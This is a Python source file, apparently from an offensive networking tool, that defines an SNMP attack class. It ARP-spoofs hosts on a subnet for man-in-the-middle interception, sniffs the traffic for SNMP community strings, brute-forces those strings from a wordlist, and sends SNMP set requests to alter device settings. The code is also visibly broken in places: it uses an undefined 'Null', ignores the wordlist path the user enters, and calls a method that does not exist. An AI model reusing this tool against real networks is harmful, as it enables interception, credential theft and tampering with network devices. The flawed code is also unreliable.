from datetime import datetime,timedelta

import time
from pysnmp.hlapi import *
import scapy.all as scapy
from scapy.layers import snmp, l2
import subprocess
from threading import Thread
 

class SNMP_Attacks:
    def __init__(self,ip,ip_option,port,interface,community):
        self.ip = ip
        self.ip_option = ip_option
        self.port = port
        self.interface = interface
        self.community = community
        
        ##Extras##
        self.network = Null
        self.choice = Null
        self.date = datetime.now()
       
        
    """
    def snmp_analyse_get_packets(self,packet):
        if (self.ip_option == "ipv4" or self.ip_option == "1"):
                udp_transport = UdpTransportTarget((self.ip, self.port))
        else:
            udp_transport = Udp6TransportTarget((self.ip, self.port))
        print("You may consider to use Wireshark for more proper results")
        OID = input("OID (example: '.1.3.6.1.2.1.1.5.0', Try again if no answer!): ")
        try:
            com = getCmd(SnmpEngine(),CommunityData(self.community),udp_transport,ContextData(),ObjectType(ObjectIdentity(OID)))
            next(com)
            
            if packet.haslayer(snmp.SNMPvarbind):
                value = ((packet[snmp.SNMPvarbind].value))
                print("Value: " + str(value))
                packet = ""
        except:
            print("invalid OID")
    """ 
    
 
    def sniff_community(self,packet):
 
        if datetime.now()-self.date  >= timedelta(minutes=19):
            self.mitm_attack(self.network,self.choice,Null)
            time.sleep(20)
        if packet.haslayer(snmp.SNMP):
            packet.show()
            value = ((packet[snmp.SNMP].community))
            print(f"!!!!!!!!!!!!!!\n Found Community:  {value} \n!!!!!!!!!!!!!!")
   
    def sniff_bruteforce(self,packet):
     
        if datetime.now()-self.date  >= timedelta(minutes=19):
            self.mitm_attack(self.network,self.choice,Null)
            time.sleep(20)
        if packet.haslayer(snmp.SNMP):
            packet.show()
            value = ((packet[snmp.SNMP].community))
            print(f"!!!!!!!!!!!!!!\n Found Community:  {value} \n!!!!!!!!!!!!!!")
    
        

                    
    
    
    def mitm_attack(self,network,choice,my_scheduler):
        mac_list = []
        my_ip = ""
        target_mac = ""
        
        try:
            subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward')
        except:
            print("Please enable IP routing if using Windows or Mac!")
        # Create arp packet object. pdst - destination host ip address
        arp_request = scapy.ARP(pdst=network)
            # Create ether packet object. dst - broadcast mac address. 
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            # Combine two packets in two one
        arp_request_broadcast = broadcast/arp_request
            # Get list with answered hosts
        answered_list,unanswered_list = scapy.srp(arp_request_broadcast,timeout=3,
                                    iface=self.interface)
        
        for i in range(1,len(answered_list)+1):
            if (answered_list[i-1][0].pdst == answered_list[i-1][0].psrc):
                my_ip = answered_list[i-1][0].pdst
            mac_list.append((answered_list[i-1][0].pdst,answered_list[i-1][1].hwsrc))


        for mac_tuple in mac_list:
            if mac_tuple[0] == my_ip:
                mac_list.pop(mac_list.index(mac_tuple))
                
            if mac_tuple[0] == self.ip:
                target_mac = mac_tuple[1]
              
                  
        if choice == "2":  
            packet = l2.ARP(op=2, pdst=self.ip, hwdst=target_mac,
                            psrc=network)  
            scapy.send(packet,iface=self.interface)
        else:
            for i in mac_list:
                packet = l2.ARP(op=2, pdst=i[0], hwdst=i[1],
                            psrc=network) 
                scapy.send(packet,iface=self.interface)  
                    
        
                               
    ###########################################################
    ###########################################################
    ###########################################################
    
    
    def snmp_get(self):   
        while True:
            OID  = input("OID to get: ")
            p = snmp.IP(dst=self.ip)/snmp.UDP(sport=int(self.port))/snmp.SNMP(community=self.community,PDU=snmp.SNMPget(varbindlist=[snmp.SNMPvarbind(oid=OID)]))
            packet = scapy.sr1(p)
            packet.show()
            if packet.haslayer(snmp.SNMPvarbind):
                    value = ((packet[snmp.SNMPvarbind].value))
                    print("Value (Ignore the encode errors like '♦'): " + str(value))    
        
                          
                
    def snmp_set(self):
        while True:
            OID  = input("OID to get: ")
            value = input("Value to set: ")
            
            p = snmp.IP(dst=self.ip)/snmp.UDP(sport=int(self.port))/snmp.SNMP(community=self.community,PDU=snmp.SNMPset(varbindlist=[snmp.SNMPvarbind(oid=OID,value=str(value))]))
            packet = scapy.sr1(p)
            if packet.haslayer(snmp.SNMPvarbind):
                    value = ((packet[snmp.SNMPvarbind].value))
                    print("Value succesfully designated with value (Ignore the encode errors like '♦'): " + str(value))    
        scapy.sniff(iface=self.interface,store=False,prn=self.snmp_analyse_set_packets)

   
    def snmp_sniff(self):   
        network = input("Network in format: IP/CIDR (Ex: 192.168.0.0/24): ")
        choice = input("Do you want to poison every client too on your MITM attack in case of any router protection?\n1-Yes\n2-No\n")
        self.network = network
        self.choice = choice
        
        self.mitm_attack(network,choice,Null)
        #time.sleep(20)
        scapy.sniff(iface=self.interface,store=False,prn=self.sniff_community)


    def snmp_community_bruteforce(self):
        path = input("Path To Wordlist: ") 
        wordlist_file = open("wordlist.txt","r")
        lines = wordlist_file.readlines()
        for line in lines:
            word = line.strip('\n')
        
            p = snmp.IP(dst=self.ip)/snmp.UDP(sport=int(self.port))/snmp.SNMP(community=word,PDU=snmp.SNMPget(varbindlist=[snmp.SNMPvarbind(oid=".1.3.6.1.2.1.1.5.0")]))
            ans,unansw = scapy.sr(p,iface=self.interface,retry=0,timeout=0.1)
            print("Trying: " + word + "\r")
            if(ans.show != None):
                if ans[snmp.UDP]:
                    if ans[snmp.SNMP] != None or ans[snmp.SNMP != Null]:
                            value = (word)
                            print(f"!!!!!!!!\nValid Community: {value}\n!!!!!!!! ") 
                            break

               
        